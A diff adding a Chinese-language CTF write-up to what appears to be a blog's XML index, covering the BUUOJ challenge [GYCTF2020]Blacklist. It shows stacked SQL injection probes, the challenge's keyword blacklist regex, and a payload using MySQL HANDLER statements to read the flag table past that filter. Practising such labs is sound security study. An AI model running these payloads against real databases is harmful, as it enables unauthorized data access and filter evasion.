@@ -20,6 +20,45 @@
       </tags>
   </entry>
   <entry>
+    <title>[GYCTF2020]Blacklist</title>
+    <url>/2021/11/10/GYCTF2020/</url>
+    <content><![CDATA[<blockquote>
+<p>平台：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p>
+</blockquote>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>很显然是sql注入，打开页面后回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>用一些常用的命令看看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;%23</span><br><span class="line">1&#x27;;show tables;%23</span><br><span class="line">select</span><br></pre></td></tr></table></figure>
+
+<p>得到两个有用的信息：</p>
+<ol>
+<li><p>flag在FlagHere内</p>
+</li>
+<li><p>过滤了以下关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>但是没有过滤handler</p>
+<p>因此这里可以这样堆叠注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;%23</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HANDLER ... OPEN语句打开一个表，使其后续可以使用HANDLER ... READ语句访问。该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CTF日常练习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>sql注入</tag>
+        <tag>堆叠注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>新的起点</title>
     <url>/2021/10/31/%E6%96%B0%E7%9A%84%E8%B5%B7%E7%82%B9/</url>
     <content><![CDATA[<p>严格地说，这是我的第三个博客。</p>
